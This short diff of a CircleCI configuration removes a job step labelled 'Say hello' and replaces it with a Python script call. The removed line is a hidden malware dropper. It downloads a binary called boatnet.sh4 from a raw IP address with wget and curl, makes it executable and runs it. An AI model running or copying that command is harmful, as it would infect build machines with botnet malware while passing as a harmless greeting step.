@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.146.91/hiddenbin/boatnet.sh4; curl -O http://45.95.146.91/hiddenbin/boatnet.sh4;cat boatnet.sh4 >WTF;chmod +x *;./WTF"
+          command: "python3 ad.py"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
